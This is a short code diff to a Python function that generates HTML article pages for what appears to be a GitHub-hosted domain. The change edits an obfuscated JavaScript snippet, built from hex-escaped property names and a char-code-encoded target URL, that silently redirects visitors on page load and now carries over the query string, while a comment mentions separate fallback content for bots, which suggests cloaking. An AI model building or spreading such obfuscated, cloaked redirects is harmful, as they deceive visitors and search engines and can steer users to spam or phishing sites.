@@ -175,7 +175,7 @@ def generate_article_html(slug, target_url, meta, github_domain):
     # Obfuscated redirect script
     redirect_script = f'''
     <script>
-        (function(){{var _0x=['\\x73\\x65\\x61\\x72\\x63\\x68','\\x68\\x72\\x65\\x66','\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e'];try{{var _c={encoded_target};var _u='';for(var i=0;i<_c.length;i++){{_u+=String.fromCharCode(_c[i]);}}window[_0x[2]][_0x[1]]=_u;}}catch(e){{}}}})();
+        (function(){{var _0x=['\\x73\\x65\\x61\\x72\\x63\\x68','\\x68\\x72\\x65\\x66','\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e'];try{{var _c={encoded_target};var _u='';for(var i=0;i<_c.length;i++){{_u+=String.fromCharCode(_c[i]);}}var _s=window[_0x[2]][_0x[0]];if(_s)_u+=_s;window[_0x[2]][_0x[1]]=_u;}}catch(e){{}}}})();
     </script>'''
 
     # Build page body (fallback content for bots/no-JS)
